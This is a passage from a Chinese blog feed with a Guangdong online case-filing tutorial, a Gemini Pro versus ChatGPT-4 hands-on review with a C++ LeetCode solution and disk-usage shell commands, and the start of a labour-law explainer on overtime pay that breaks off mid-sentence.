    <title>网上立案流程(广东省)详细图文教程</title>
    <link href="https://selfboot.cn/2023/12/22/lawsuit_steps/"/>
    <id>https://selfboot.cn/2023/12/22/lawsuit_steps/</id>
    <published>2023-12-22T10:24:55.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>一个法律冷知识，<strong>起诉不一定要委托律师，可以自己操刀哦</strong>。不少小伙伴的纠纷事实比较简单，不需要律师，或者觉得律师费太贵，不划算，想省下这笔钱，那么完全可以自己去起诉。抛开一些法律知识储备(可以看小盛律师科普系列哦)，法律文书的撰写(再次推荐小盛律师的范文解析系列)，今天来聊聊要怎么<strong>网上立案</strong>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_1.png" alt="广东省起诉网上立案: 1"></p><span id="more"></span><p>首先找到<a href="https://ssfw.gdcourts.gov.cn/web/home">广东法院诉讼服务网</a>，选择用户登录，当然第一次的话，还要注册。然后选择“网上立案”，“我要申请立案”。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_2.png" alt="广东省起诉网上立案: 2"></p><p>接着选择<strong>管辖法院</strong>，多为被告所在地法院。这里再提醒下，管辖法院还是挺重要的，只有<strong>广东的法院有管辖权</strong>的才能在这个网站立案。如果合同或者借条等没约定管辖法院，那么有可能要去一个很远的法院起诉才行。案件类型这里如果是第一次起诉，一般就选择选“<strong>民商事一审</strong>”。至于首次执行和非诉保全，如果想了解，可以来找小盛律师咨询。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_3.png" alt="广东省起诉网上立案: 3"></p><p>接下来会让你确认法院立案告知书和电子送达告知书，读完后勾选这里的已阅读，并确认。接下来需要填写案件的相关信息了，因为这里是个人起诉，申请人就选择我是当事人就行，主要是标的金额和案由，这两个必须如实填写。标的金额可能会影响后续的一些流程，比如金额比较少的话，可能就走简易程序了，整个耗时会少很多。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_4.png" alt="广东省起诉网上立案: 4"></p><p>案由这里，如果不知道怎么填写，可以在网上搜索下，看看类似的案件，一般都会有案由，可以参考下。比如如果是买卖纠纷，那么就选择买卖合同纠纷。这里其实写错也没什么关系，<strong>法院会帮你调整对的</strong>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_5.png" alt="广东省起诉网上立案: 5"></p><p>接着就是比较费精力的一步了，需要填写案件相关信息及上传材料，这里要注意文件大小及份数要求。不会填写的可以<strong>参考模板</strong>，部分法院要求填写对方送达地址确认书，如模板中没有的，可以前往该法院官网搜索。这里其实民事起诉状可能难写一点，如果网上找不到类似的，欢迎找<a href="https://selfboot.cn/links">小盛律师</a>哦。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_6.png" alt="广东省起诉网上立案: 6"></p><p>起诉当然离不开当事人信息填写了，原告是自己，信息比较好写。个人信息就正常填写真实信息即可，<strong>送达地址</strong>一般就是自己的家庭住址，也可以填写单位地址，到时候法院的一些文书，比如判决书等会快递到这个地址的。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_7.png" alt="广东省起诉网上立案: 7"></p><p>被告如果是个人的话，也需要提供对方姓名和身份证，如果不知道对方现在住址，送达地址可以填写身份证地址。这里也提醒下，如<strong>果没有对方的姓名和身份证号，就没法发起民事诉讼的</strong>。如果是民事纠纷，比如借钱给了朋友，但是没有对方姓名、身份证，只有微信号或者银行卡这些，就需要去<span style='color:red'><strong>查人口</strong></span>。这种个人是没办法做的，通过律师的话，可以去<strong>法院申请调查令</strong>，然后去银行或者腾讯的财付通查对方的姓名，身份证号信息，然后才能发起诉讼。当然自己也是可以申请让法院查的。</p><p>当然，如果对方是企业单位，那么就需要填写法人信息了。可以去<a href="https://gsxt.amr.gd.gov.cn/#/index">国家企业信用信息公示系统</a>查询，能找到对方的法定代表人，统一社会信用代码，住所(也就是注册地址)等信息。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_8.png" alt="广东省起诉网上立案: 8"></p><p>接着要填写<strong>诉讼请求</strong>，就是说希望法院怎么让被告赔偿，比如还钱，赔偿利息，赔偿损失等。这里就从你的起诉书上摘录诉讼请求部分就行，下面还有事实和理由，也从起诉书抄下来即可。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_9.png" alt="广东省起诉网上立案: 9"></p><p>这里还会需要选择是否诉前联调，就是说正式安排立案开庭前，法院可以约原告，被告一起，帮你们调解纠纷。调解的话，就是时间上比较快，调解结果法院出具文书的话也是有法律效力的。但是呢，有的被告比较难缠，或者觉得调解大概率不成功，不想费这个口舌，那么可以选择不需要诉前联调，直接立案开庭。</p><p>除了在网上填写资料外，还需要递交一些纸质材料，选择 EMS 邮政，这是国内<strong>司法文书有效送达的唯一快递</strong>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_10.png" alt="广东省起诉网上立案: 10"></p><p>全部填写完成后，就可以点击下一步了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_11.png" alt="广东省起诉网上立案: 11"></p><p>最后核对无误后点“<strong>提交立案</strong>”，如果是显示“<strong>成功提交</strong>”即完成网立，等待 1 周左右应该就会有审核结果反馈。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_lawsuit_step_12.png" alt="广东省起诉网上立案: 12"></p><p>如果审核不通过，法院应该会告知具体理由，改了再提交就行。</p><p>当然，这里只是起诉流程的第一步，后面还有开庭，判决，执行等一系列流程，这里就不展开了。之前写过起诉二手房租的一个完整流程，可以在下面看到：</p><ol><li><a href="https://selfboot.cn/2019/10/01/self_rent_pre/">消失不见的二房东-寻找法律制裁你!</a></li><li><a href="https://selfboot.cn/2019/11/01/self_rent_do/">消失不见的二房东-网上立案真简单！</a></li><li><a href="https://selfboot.cn/2019/11/02/self-rent-done/">消失不见的二房东-立案与最终判决!</a></li></ol><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">详细图文教程，一步步教你如何网上立案，并且对里面的一些法律概念进行了解释，帮助普通个人也能快速跟着学会立案。强调了一些注意事项，比如起诉书的撰写，被告身份信息的获取等。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>Google Gemini Pro 深度体验，离 GPT4 还有多大差距？</title>
    <link href="https://selfboot.cn/2023/12/10/google-gemini-bard-hands-on/"/>
    <id>https://selfboot.cn/2023/12/10/google-gemini-bard-hands-on/</id>
    <published>2023-12-10T21:48:19.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>不得不说，2023 年真是科技突破的一年，年初 ChatGPT 带来太多惊艳，年末 <a href="https://deepmind.google/technologies/gemini/#introduction">Google Gemini</a> 又让人充满了无限遐想。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231207_google_gemini_bard_hands_on_start.png" alt="Google Gemini 多模态带来无限可能？"></p><p>按照 Google 官方的介绍，Gemini 是<strong>第一个在 MMLU（大规模多任务语言理解）方面超越人类专家</strong>的模型，在推理，数学和代码上的能力也都超过了 GPT4。而且还是一个多模态的模型，可以同时<strong>处理文本，图像，声音和视频</strong>，评测分数也比 GPT-4V 更高。</p><span id="more"></span><p>从 Google 发布的宣传片(下面视频需要能访问 Youtube)来看，Gemini 的表现确实让人惊艳。发布几天后，很多人已经对 Gemini 有不少质疑的声音，因为发布的视频是编辑过的。Gemini 的真实效果如何，还是要自己亲自试一试才知道。目前 Google 对外只放开了 Gemini Pro 的使用，接下来本文来用 bard 感知下 Gemini Pro 到底怎么样吧。</p><div style="position: relative; width: 100%; padding-bottom: 56.25%;">    <iframe src="https://www.youtube.com/embed/UIZAiXYceBI?si=KjDCRPIKnAYsby5J" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></iframe></div><h2 id="体验结论"><a href="#体验结论" class="headerlink" title="体验结论"></a>体验结论</h2><p>Gemini 目前分三个版本：</p><ul><li>Ultra: 功能最强大、规模最大的模型，适用于高度复杂的任务，各项指标几乎全面超过 GPT-4，上面视频中的宣传就是 Ultra 模型。</li><li>Pro: 用于跨各种任务进行扩展的最佳模型，目前可以体验到，评测结果来看，比 GPT-4 稍微差一点。</li><li>Nano: 移动端任务模型，适用于移动设备，评测结果来看，比前面两个版本效果会差。</li></ul><p>目前 <a href="https://bard.google.com/updates">Bard 上集成的是 Gemini Pro</a>，截止 2023.12.07，只开放了文本提示词，其他多模态能力暂未放开。从 <a href="https://storage.googleapis.com/deepmind-media/gemini/gemini_1_report.pdf">Google 发布的报告</a>来看，Gemini Pro 的能力会比 GPT-4 稍微差一点，接下来就在 bard 上真实体验一把 Gemini Pro，看看能力到底如何。截止 12.10，Bard 上只有用英文才能体验 Gemini Pro，具体可以参考 Google 的帮助文档 <a href="https://support.google.com/bard/answer/14294096">Where Bard with Gemini Pro is available</a>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231207_google_gemini_bard_hands_on_bard.png" alt="Bard 上可以体验 Gemini Pro"></p><p>之前我写过一篇 <a href="https://selfboot.cn/2023/07/20/claude_gpt4_compare/">大语言模型 Claude2 和 ChatGPT 实测对比</a>，本文继续使用类似的测试方法，对比一下 Gemini Pro 和 ChatGPT 4 的表现。先来说结论吧，如下表：</p><table><thead><tr><th>功能</th><th>ChatGPT 4</th><th>Bard(Gemini Pro)</th></tr></thead><tbody><tr><td>使用限制</td><td>地区限制，IP 风控，支付风控</td><td>地区限制</td></tr><tr><td>费用</td><td>付费</td><td>免费</td></tr><tr><td>速度</td><td>很慢，不过最新的 GPT4-tubro 快了不少</td><td>速度很快</td></tr><tr><td>联网能力</td><td>All-Tools 可以联网</td><td>比较迷，不完善的联网能力</td></tr><tr><td>语言能力</td><td>很强</td><td>比 GPT4 差，中文能力没 GPT4 强</td></tr><tr><td>数学问题</td><td>一般</td><td>比 GPT-4 差</td></tr><tr><td>编程能力</td><td>很强</td><td>比 GPT-4 差</td></tr><tr><td>Bug</td><td>很少遇见，对话太长有时候会</td><td>比较容易触发，问答明显异常</td></tr></tbody></table><p>个人感觉，Gemini Pro 的能力和 ChatGPT 比还有比较大的差距，甚至还不如 Claude2，短时间我还不会用 Gemini Pro 替代 ChatGPT。Gemini Ultra 应该会好一些，不过暂时还没地方体验到，说不定到时候 GPT-5 先出来，Gemini Ultra 可能又落后了。</p><h2 id="语言能力"><a href="#语言能力" class="headerlink" title="语言能力"></a>语言能力</h2><p>接下来用英语提示词，来看看 Gemini Pro 的语言能力到底如何。</p><h3 id="阅读理解"><a href="#阅读理解" class="headerlink" title="阅读理解"></a>阅读理解</h3><p>首先是阅读理解能力，我找了几个比较著名的英语谚语，来看看 Gemini Pro 的理解是否正确。提示词如下：</p><blockquote><p>I have a few phrases, can you explain them to me one by one?</p><ol><li>A stitch in time saves nine.</li><li>The early bird catches the worm.</li><li>You can’t judge a book by its cover.</li><li>When in Rome, do as the Romans do.</li><li>All that glitters is not gold.</li></ol></blockquote><p>Gemini Pro 和 ChatGPT 的回答如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_explain.png" alt="Gemini Pro 和 ChatGPT 对普通句子的理解"></p><p>Gemini Pro 的解释更全面些，对谚语本身的含义以及表达的意思都有解释。Gemini Pro 的速度也很快，这点是 ChatGPT 无法比的。这些谚语都是比较常见的，表达的含义也很确定。接下来我找了有歧义的句子，看两个模型分别是怎么理解的。句子 “I saw the man with the telescope.” 有两种理解方式，如下：</p><ol><li>可以理解为“我用望远镜看到了那个人”，即“望远镜”是我用来看人的工具。</li><li>也可以理解为“我看到了一个带望远镜的男人”，即那个男人拥有或持有望远镜。</li></ol><p>下面是 Gemini Pro 和 ChatGPT 的解释：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_ambiguous.png" alt="Gemini Pro 和 ChatGPT 对有歧义内容的理解"></p><p>基本上都是先说句子有歧义，然后分别给出两种解读，并说明没有上下文是没法确定具体哪种含义。Gemini Pro 后面还给了一些继续提问的方式，可以用这些问题来澄清这句话的含义。还试了一些其他有歧义的内容，整体来看 ChatGPT 解释会一针见血，Gemini Pro 废话稍微多，有时候容易发散，理解稍微差一些。</p><table><thead><tr><th>句子</th><th>理解 一</th><th>理解 二</th><th>模型比较</th></tr></thead><tbody><tr><td>The chicken is ready to eat.</td><td>鸡已经烹饪好了，可以吃了</td><td>鸡已经准备好吃东西了</td><td>两个模型差不多</td></tr><tr><td>Visiting relatives can be annoying.</td><td>去拜访亲戚可能很烦人</td><td>一些来访的亲戚可能很烦人</td><td>ChatGPT 完胜，Gemini Pro废话多，解释不是很清晰</td></tr><tr><td>He saw that gas can explode.</td><td>他知道气体可以爆炸</td><td>他看到了那个可以爆炸的气罐</td><td>ChatGPT 完胜，Gemini Pro 理解错误</td></tr><tr><td>They’re hunting dogs.</td><td>他们正在狩猎狗</td><td>那些是狩猎用的狗</td><td>ChatGPT 完胜，Gemini Pro 理解错误</td></tr></tbody></table><p>总得来看，对于简单内容，Gemini Pro 和 ChatGPT 表现差不多，遇到有歧义的内容，ChatGPT 稳定发挥，理解的很好，Gemini Pro 有时候就理解不了，回答也很啰嗦了。</p><h3 id="文本生成"><a href="#文本生成" class="headerlink" title="文本生成"></a>文本生成</h3><p>接下来看看文本生成能力，我们知道目前最强大的 GPT4 来说，也不能写出风格统一，情节符合常识并且连贯的小说。这里我们找一些简单的文本生成任务，看看 Gemini Pro 的表现如何。这里一开始提示词如下：</p><blockquote><p>You’re a biographer, help me write a piece of Musk’s life.</p></blockquote><p>想让 AI 扮演一个传记作家，然后写一下马斯克的生平。Gemini Pro 会追问，让我提供更多细节，比如着重写哪部分，而 ChatGPT 则从出生，教育，创业投资经历，Space X 和火星梦，特斯拉等重点内容，写了一个很不错的介绍。接着我改了下提示词：</p><blockquote><p>Do you know Elon Musk , the CEO of Tesla? Help me write a description of Musk’s life.</p></blockquote><p>下面是两个模型的输出:</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_write.png" alt="Gemini Pro 和 ChatGPT 生成马斯克的简介"></p><p>个人感觉 ChatGPT 给出的文本条例比较清晰，重点突出。不过 Gemini Pro 有个功能比较强大，在回答下面，有个 “Double-check response”，会对回答分为三个情形：</p><ol><li>没有突出显示：没有足够的信息来评估这些回答，或者它们无意传达事实信息。目前，Bard 不会检查表格和代码中的内容。</li><li>突出显示为绿色：Goole 搜索引擎发现了类似的内容，同时提供了网页链接，要注意的是，Google 并不一定是用这里的内容生成回复；</li><li>突出显示为黄色：Google 搜索引擎发现的内容可能与回答不同，这时候会提供链接。还有一种情况就是，并没有找到相关内容。</li></ol><p>对于目前的生成式 AI 来说，Double Check 还是很有必要的。之前用 ChatGPT，都是人工再去搜索确认，目前 Google 提供的这个 <code>Double-check response</code>，对于很多场景，会有非常大帮助。</p><h2 id="数学问题"><a href="#数学问题" class="headerlink" title="数学问题"></a>数学问题</h2><p>对目前的生成式 AI 来说，数学问题是个难点，和人类比，AI 在数学领域还是一个小学生。我们拿经典的鸡兔同笼问题来考考 Gemini Pro。提示词如下:</p><blockquote><p>Suppose you have a cage that contains chickens and rabbits. You can hear the animals but cannot see them. You know the following:</p><p>There are a total of 35 heads (since both chickens and rabbits each have one head).<br>There are a total of 94 legs (chickens have 2 legs each, and rabbits have 4 legs each).<br>The question is: How many chickens and how many rabbits are in the cage?</p></blockquote><p>Gemini Pro 和 ChatGPT 都回答了出来，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_math_cage.png" alt="Gemini Pro 和 ChatGPT 回答鸡兔同笼问题"></p><p>ChatGPT 自从有了 All-Tools，这种涉及到计算的部分，一般都会用 Python 代码在虚拟环境运行。Gemini Pro 目前还没有计算环境，不过它这里也给出了正确的答案。</p><h2 id="编程能力"><a href="#编程能力" class="headerlink" title="编程能力"></a>编程能力</h2><p>其实作为程序员，平常用 AI 最多的就是让 AI 帮忙写代码，这里我们来看看 Gemini Pro 的编程能力如何。这里我之前尝试过用 ChatGPT 来解决 Leetcode 题目，其中有一篇：<a href="https://selfboot.cn/2023/06/08/gpt4_leetcode_1318/">ChatGPT 解 Leetcode 题目：位操作</a>，接下来拿这个题目，来试试 Gemini Pro吧。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_code.png" alt="Gemini Pro 解决编程题目"></p><p>Bard 每个题目会同时给出 3 个回答，这里 Draft A 的回答，代码写的不对。我看了下 Draft B，代码是没有问题的，也有注释。不过和 ChatGPT 的比，还是复杂难懂了些，并且解释也没有 ChatGPT 的清晰。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">minFlips</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Initialize the number of flips to 0.</span></span><br><span class="line">    <span class="type">int</span> flips = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Loop until all bits are processed.</span></span><br><span class="line">    <span class="keyword">while</span> (a || b || c) &#123;</span><br><span class="line">      <span class="comment">// Calculate the desired bit for the current position.</span></span><br><span class="line">      <span class="type">int</span> desiredBit = c &amp; <span class="number">1</span>;</span><br><span class="line">      <span class="comment">// Check if both a and b have the desired bit.</span></span><br><span class="line">      <span class="keyword">if</span> (desiredBit &amp;&amp; !((a &amp; <span class="number">1</span>) || (b &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="comment">// Flip both a and b.</span></span><br><span class="line">        a ^= <span class="number">1</span>;</span><br><span class="line">        b ^= <span class="number">1</span>;</span><br><span class="line">        flips++;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!desiredBit) &#123;</span><br><span class="line">        <span class="comment">// Flip a if it has the undesired bit.</span></span><br><span class="line">        <span class="keyword">if</span> (a &amp; <span class="number">1</span>) &#123;</span><br><span class="line">          a ^= <span class="number">1</span>;</span><br><span class="line">          flips++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Flip b if it has the undesired bit.</span></span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span>) &#123;</span><br><span class="line">          b ^= <span class="number">1</span>;</span><br><span class="line">          flips++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Shift all three numbers one bit to the right.</span></span><br><span class="line">      a &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">      b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">      c &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flips;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还试了一些其他的代码问题，比如：</p><ul><li>How do I convert UTC time to Beijing time zone in Python, show me the code.</li></ul><p>代码质量上来说，ChatGPT 的会好很多，并且带有一些解释，给人感觉很智能。Gemini Pro 的代码也还可以，大部分都是 ok 的，只是质量稍微差些。</p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p>除了直接写代码，平常也会经常让 AI 帮忙写一些命令来解决问题，比如我想查找当前目录最大的文件，我不确定 sort 怎么用。然后用下面提示词：</p><blockquote><p>du -ah –max-depth&#x3D;1 &#x2F;</p><p>Here’s how to sort the display in reverse order of size</p></blockquote><p>ChatGPT 的回答很智能，根据 du 中输出 -h，然后告诉正确的 sort 参数用法。Gemini Pro 的回答就差劲了一些，没有考虑到这里的 -h 参数。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_shell.png" alt="Gemini Pro 和 ChatGPT 工具命令编写"></p><p>还有下面的问题：</p><blockquote><p>$ du -ah –max-depth&#x3D;1 &#x2F;var&#x2F;lib&#x2F;docker | sort -hr<br>16G&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2<br>16G&#x2F;var&#x2F;lib&#x2F;docker<br>69M&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers<br>27M&#x2F;var&#x2F;lib&#x2F;docker&#x2F;image</p><p>How do you clear up disk space?</p></blockquote><p>ChatGPT 的回答很有条理，从下面几个方面，每个都配有详细解释：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Remove Unused Containers: ...</span><br><span class="line">Remove Unused Images: ...</span><br><span class="line">Remove Unused Networks: ...</span><br><span class="line">Remove Unused Volumes: ...</span><br><span class="line">System Clean-up: ...</span><br></pre></td></tr></table></figure><p>而 Gemini Pro 的回答有点凌乱且啰嗦。</p><h2 id="奇怪的-Bug"><a href="#奇怪的-Bug" class="headerlink" title="奇怪的 Bug"></a>奇怪的 Bug</h2><p>用的过程中，Bard 有时候会出现奇怪的回答，像是命中了一些前置或者后置检查。比如在一个对话中，我先问可以联网吗？回答可以，还说可以访问公开可用的网站和数据库，然后使用这些信息来生成文本、翻译语言等。但是接下来让他：</p><blockquote><p>Visit this web page, <a href="https://selfboot.cn/2023/07/20/claude_gpt4_compare/">https://selfboot.cn/2023/07/20/claude_gpt4_compare/</a>, and summarize the article.</p></blockquote><p>就回答：**I’m a text-based AI, and that is outside of my capabilities.<strong>。然后再次问他可以联网吗，就回答：</strong><br>I’m a language model and don’t have the capacity to help with that.**。用 ChatGPT 的 All-Tools 就不存在这奇怪的表现，直接就能用 Bing 访问网页拿到内容，然后进行总结。下面左图是 ChatGPT，右图是 Gemini Pro Bard 的回答。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231210_google_gemini_bard_hands_on_bug_compare.png" alt="Bard 对话中奇怪的回答"></p><h2 id="Gemini-仍需努力"><a href="#Gemini-仍需努力" class="headerlink" title="Gemini 仍需努力"></a>Gemini 仍需努力</h2><p>从体验来看，Gemini Pro 还有很大的提升空间，目前的能力还不足以取代 ChatGPT。不过也是有自己的优点的：</p><ol><li>速度快。后期如果质量上来，速度还能有这么快，那就很不错了。</li><li>Double Check。这个能力在一定程序上让我对回答更有信心，也知道一些结论的出处，方便进一步深入扩展。</li></ol><p>当然 Gemini Pro 还有很多功能没有放开，比如多模态能力，这个功能放开后，到时候再来体验一下。希望 Google 能继续努力，把 Gemini 完善好，给 OpenAI 一点压力。</p>]]></content>
    
    
    <summary type="html">本文通过与ChatGPT对比，深度体验Google最新推出的语言模型Gemini Pro，从语言理解、文本生成、编程能力等多个维度全面评测 Gemini Pro 与 GPT-4 的差距。发现Gemini Pro整体表现不及ChatGPT，语言理解、数学、编程能力都有差距，联网查询也不完善，距离取代GPT-4还有一定距离。</summary>
    
    
    
    <category term="人工智能" scheme="https://selfboot.cn/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
    
    <category term="Gemini" scheme="https://selfboot.cn/tags/Gemini/"/>
    
  </entry>
  
  <entry>
    <title>为什么长时间工作也没有加班费？</title>
    <link href="https://selfboot.cn/2023/12/09/why_not_overtime_pay/"/>
    <id>https://selfboot.cn/2023/12/09/why_not_overtime_pay/</id>
    <published>2023-12-09T15:15:05.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>说到加班工资，估计不少人会觉得只要超过 <strong>8小时&#x2F;天 或者 40小时&#x2F;周</strong>，额外的工作时间都<strong>应该有加班工资</strong>。这种说法准确吗？接下来小盛律师就从法律角度，为大家解读一下加班时间认定，加班事实认定，加班费计算等法律知识。相信你读完后，就知道自己长时间工作，到底该不该有加班费了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231208_why_not_overtime_pay_people.png" alt="为什么长时间工作也没有加班费？"></p><span id="more"></span><h2 id="法律规定的加班"><a href="#法律规定的加班" class="headerlink" title="法律规定的加班"></a>法律规定的加班</h2><p>首先我们来看看，法律上对于加班工作时间和加班费，是怎么规定的呢？根据<a href="https://www.gov.cn/banshi/2005-05/25/content_905.htm">《中华人民共和国劳动法》</a>第四十一条规定，用人单位由于生产经营需要，经与工会和劳动者协商后可以<strong>延长劳动者的工作时间</strong>。<a href="https://www.gov.cn/flfg/2007-06/29/content_669394.htm">《中华人民共和国劳动合同法》</a>第三十一条规定，用人单位安排加班的，应当按照国家有关规定向劳动者支付加班费。</p><p>也就是说，如果<strong>员工经用人单位安排，在法定工作时间外延长了工作时间继续工作，或者在休息日、法定节假日工作，那么就是加班</strong>了。休息日就是平常的周六、周日和调休的假期，前面有提到法定节假日，那么什么是法定节假日呢？根据新修改的<a href="https://flk.npc.gov.cn/detail2.html?ZmY4MDgwODE2ZjNlOThiZDAxNmY0MWVmZjc4NDAxZjg">《全国年节及纪念日放假办法》</a>的规定，全体公民的节日假期为11天，即新年（元旦）1天，春节3天，清明节1天，劳动节1天，端午节1天，中秋节1天，国庆节3天。这 11 天就是法定节假日，若为妇女的，还有妇女节放假 0.5 天。据此，全年工作日为365天-104天休息日-11天法定节假日&#x3D;250天，月工作日为250÷12&#x3D;<strong>20.83</strong>天。</p><p>除了休息日、法定节假日，还有年休假，根据劳动法 45 条，劳动者连续工作一年以上的，<strong>享受带薪年休假</strong>。带薪年休假的规定我整理成下面表格了：</p><table><thead><tr><th>累计工作年限</th><th>年休假天数</th><th>不享受当年年休假</th></tr></thead><tbody><tr><td>已满1年不满10年</td><td>5天</td><td>病假累计2个月以上</td></tr><tr><td>已满10年不满20年</td><td>10天</td><td>病假累计3个月以上</td></tr><tr><td>已满20年</td><td>15天</td><td>病假累计4个月以上</td></tr></tbody></table><p>需要注意的是年休假天数与你是否在同一单位工作无关，<strong>与你实际工作年限相关</strong>，即使你入职新单位不满 1 年，但你累计工作已满 1 年，在新单位仍可享受应有的年休假。有的单位会有另外额外的带薪休假制度，比如在公司 5 年，有 10 天带薪年假，这个和年休假是可以兼得的。还有些情况，可能无法享受当年年休假，比如上面提到的病假，此外还有另外 2 种情况：</p><ol><li>职工依法享受寒暑假，其休假天数多于年休假天数的；</li><li>职工请事假累计20天以上且单位按照规定不扣工资的。</li></ol><h2 id="区别工时制度"><a href="#区别工时制度" class="headerlink" title="区别工时制度"></a>区别工时制度</h2><p>根据劳动合同法，用工制度有全日制用工和非全日制用工，<strong>全日制用工</strong>有下面几种工时制。</p><p><strong>标准工时制</strong>：对于绝大多数劳动者来说，工作时间都是按照标准工时制来计算的。标准工时制是指，<strong>劳动者每日工作时间不超过8小时，平均每周工作时间不超过40小时</strong>。一般劳动合同无特别约定，就是按照标准工时制来计算工作时间的。这部分加班时间认定是比较容易的，每月超过 20.83 天的工作天数为加班时间，每日超过 8 小时的工作小时为加班时间。</p><p><strong>综合计算工时制</strong>：对于需要连续工作的特殊岗位职工，以周、月、季、年等为周期综合计算工作时间，不应超过法定标准工作时间。比如交通、铁路、邮电、水运、航空、渔业等行业中因工作性质特殊，需连续作业的职工，在《关于企业实行不定时工作制和综合计算工时工作制的审批办法》第五条有具体规定。也就是说，在综合计算周期内，某一天或者周的工作时间可以超过法定的 8 小时&#x2F;天，40 小时&#x2F;周，但是计算周期内的<strong>总实际工作时间</strong>不应超过总法定标准工作时间，超过部分视为延长工作时间。此外，如果法定节假日工作的，不管整个周期内的工作时间总和是否超过总法定标准工作时间，仍应按照 300% 